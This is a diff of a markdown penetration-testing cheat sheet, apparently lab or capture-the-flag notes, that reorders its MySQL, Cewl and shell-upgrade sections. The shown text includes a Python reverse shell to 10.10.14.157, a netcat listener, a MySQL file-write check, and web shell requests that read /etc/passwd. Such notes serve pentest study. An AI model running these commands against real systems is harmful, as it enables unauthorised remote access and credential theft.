@@ -24,9 +24,9 @@
 - [5. netcat](#nc)
 - [5.FTP](#ftp)
 - [6. SSH](#ssh)
-- [7. Mysql](#mysql)
-- [8. Cewl](#cewl) - It is use to create a worldlist using website link
-- [11. shell upgreade](#shell)
+- [7. shell upgreade](#shell)
+- [8. Mysql](#mysql)
+- [9. Cewl](#cewl) - It is use to create a worldlist using website link
 - [12. Post-Exploit Enumeration](#post)
 - [13. Password Cracking](/hash_cracking.md)
 - [14. RDP-3389](#rdp)
@@ -187,39 +187,8 @@ ssh username@target_ip #enter password if you gave any
 
 
 
-# 7. Mysql <a name="mysql"></a>
-- `mysql -h 10.0.1.22 -u root`
-    - select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;
-      - > if executed, confirms the ability to write files on the web server.
-        > ![image](https://github.com/Chittu13/web/blob/main/Image/mysql.png)
-    - Now navigate to that path where you write the shell.php
 
-        - `<url>/shell.php?cmd=id`
-        - `<url>/shell.php?cmd=cat /etc/passwd`
-
-
-
-
-
-
-# 8. Cewl <a name="cewl"></a>
-- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# 11. shell upgrade <a name="shell"></a>
+# 7. shell upgrade <a name="shell"></a>
 
 - [Upgrade to Fully Interactive TTY](/Notes/TTY.md)
 
@@ -234,7 +203,6 @@ perl -e 'exec "/bin/sh";'
 ```
 
 - `export TERM=linux` or `export TERM=xterm`
-- __`python -c 'import pty; pty.spawn("/bin/bash")'`__
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -247,6 +215,41 @@ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 ```
 - __`nc -lnvp 31337`__
 - 
+
+
+
+
+
+# 8. Mysql <a name="mysql"></a>
+- `mysql -h 10.0.1.22 -u root`
+    - select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;
+      - > if executed, confirms the ability to write files on the web server.
+        > ![image](https://github.com/Chittu13/web/blob/main/Image/mysql.png)
+    - Now navigate to that path where you write the shell.php
+
+        - `<url>/shell.php?cmd=id`
+        - `<url>/shell.php?cmd=cat /etc/passwd`
+
+
+
+
+
+
+# 9. Cewl <a name="cewl"></a>
+- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
